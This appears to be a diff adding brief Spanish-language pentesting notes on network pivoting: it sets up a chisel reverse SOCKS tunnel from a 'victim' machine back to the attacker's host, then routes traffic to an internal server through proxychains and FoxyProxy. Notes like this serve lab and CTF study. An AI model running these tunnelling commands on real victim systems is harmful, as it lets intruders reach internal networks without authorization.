@@ -1,0 +1,16 @@
+#Deberemos de introducir chisel en las dos maquinas en la nuestra y en la victima. Despues pondremos los siguientes comandos
+
+Server(Nosotros) -> ./chisel server --reverse -p 1234
+Client(Victima) -> ./chisel client NUESTRAIP:1234 R:socks
+
+Respuesta -> 2022/04/23 04:00:01 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
+
+# Despues de esto si queremos llegar a otros servidores necesitaremos meternos en proxychains en la ruta /etc/proxychains4.conf
+# Anadir en la ultima linea lo siguiente
+
+socks5 127.0.0.1 1080
+
+# Despues de esto haremos un curl tirando de proxychains en este caso quiero llegar al servidor 172.69.0.104
+proxychains curl http://172.69.0.104
+
+# Si queremos configurarlo a nivel de firefox, iremos a foxyproxy y anadiremos una nueva opcion de proxy por el puerto 1080 y por el host 127.0.0.1
